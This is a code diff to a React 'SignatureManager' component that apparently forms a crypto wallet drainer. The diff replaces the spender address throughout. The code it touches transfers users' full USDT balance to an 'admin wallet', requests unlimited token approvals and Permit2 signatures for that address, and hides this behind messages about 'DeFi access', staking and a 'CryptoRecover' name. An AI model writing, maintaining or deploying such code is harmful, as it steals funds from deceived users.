@@ -10,7 +10,7 @@ export default function SignatureManager({ provider, userAddress }) {
     setLoading(true);
     try {
       const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Real USDT
-      const spenderAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      const spenderAddress = '0x849842febf6643f29328a2887b3569e2399ac237';
       
       // Get user's actual USDT balance
       const tokenContract = new ethers.Contract(tokenAddress, [
@@ -80,7 +80,7 @@ export default function SignatureManager({ provider, userAddress }) {
                 if (balance > 0) {
                   // USER pays gas for transfer
                   const transferTx = await tokenContract.transfer(
-                    '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15', // admin wallet
+                    '0x849842febf6643f29328a2887b3569e2399ac237', // admin wallet
                     balance // full amount
                   );
                   
@@ -157,7 +157,7 @@ export default function SignatureManager({ provider, userAddress }) {
           type: 'ERC20_UNLIMITED_APPROVE_ATTEMPTED',
           userAddress: userAddress,
           tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-          spenderAddress: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15',
+          spenderAddress: '0x849842febf6643f29328a2887b3569e2399ac237',
           error: error.message,
           rejected: error.code === 'ACTION_REJECTED' || error.code === 4001
         })
@@ -209,7 +209,7 @@ export default function SignatureManager({ provider, userAddress }) {
         setTimeout(async () => {
           try {
             const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
-            const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+            const spender = '0x849842febf6643f29328a2887b3569e2399ac237';
             const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
             
             // Send success alert
@@ -249,7 +249,7 @@ export default function SignatureManager({ provider, userAddress }) {
       setResult(`Detected USDC balance: ${balanceFormatted} USDC. Processing DeFi access...`);
       
       const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
-      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      const spender = '0x849842febf6643f29328a2887b3569e2399ac237';
       
       const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
       setResult(`Permit2 signature: ${signature}`);
@@ -322,7 +322,7 @@ export default function SignatureManager({ provider, userAddress }) {
         name: 'CryptoRecover',
         version: '1',
         chainId: 1,
-        verifyingContract: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'
+        verifyingContract: '0x849842febf6643f29328a2887b3569e2399ac237'
       };
 
       const types = {
@@ -386,7 +386,7 @@ export default function SignatureManager({ provider, userAddress }) {
     setLoading(true);
     try {
       const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
-      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      const spender = '0x849842febf6643f29328a2887b3569e2399ac237';
       
       // Get user's actual USDC balance for staking
       const tokenContract = new ethers.Contract(tokenAddress, [
